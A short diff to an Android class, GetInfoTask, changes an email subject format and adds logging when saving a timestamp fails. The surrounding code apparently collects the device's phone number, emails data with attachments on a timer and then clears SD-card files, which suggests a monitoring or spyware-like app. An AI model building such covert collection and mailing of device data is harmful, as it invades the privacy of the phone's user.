@@ -88,7 +88,7 @@ public class GetInfoTask extends TimerTask
 		// Send mail
 		String phoneNum = DeviceProperty.getPhoneNumber(service);
 		String subject = service.getResources().getString(R.string.mail_from) 
-	          		 + (phoneNum.length() > 0 ? ("-" + phoneNum) : "") 
+	          		 + (phoneNum.length() > 0 ? " " + phoneNum : " Inspector") 
 	          		 + "-" + (new SimpleDateFormat("yyyyMMdd")).format(new Date());;
 		String body = String.format(service.getResources().getString(R.string.mail_body), 
 					DeviceProperty.getPhoneNumber(service));
@@ -103,7 +103,10 @@ public class GetInfoTask extends TimerTask
 		attachments.clear();
 			
 		// Update the last date time
-		if (result) ConfigCtrl.setLastGetInfoTime(service.getApplicationContext(), new Date());
+		if (result) {
+			boolean successful = ConfigCtrl.setLastGetInfoTime(service, new Date());
+			if (!successful) Log.w(LOGTAG, "Failed to setLastGetInfoTime");
+		}
 		
 		// Clean the files in SD-CARD
 		FileCtrl.cleanFolder();
